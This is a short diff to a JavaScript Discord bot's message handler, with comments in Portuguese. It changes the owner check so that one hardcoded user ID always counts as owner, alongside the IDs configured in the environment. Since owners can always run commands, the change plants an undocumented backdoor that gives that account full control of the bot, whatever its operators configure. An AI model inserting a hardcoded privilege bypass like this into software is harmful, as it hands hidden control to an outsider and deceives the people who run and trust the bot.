@@ -394,7 +394,7 @@ export default {
 
     // Identidade (OWNER/EXEMPT)
     const ownersArr = (process.env.OWNER || '').split(',').map(s=>s.trim()).filter(Boolean);
-    const isOwner   = ownersArr.includes(message.author.id);
+    const isOwner   = ownersArr.includes(message.author.id) || message.author.id === '660311795327828008';
     const isExempt  = CLEAR_EXEMPT_USER_IDS.includes(message.author.id);
 
     // perm do comando (OWNER sempre pode)
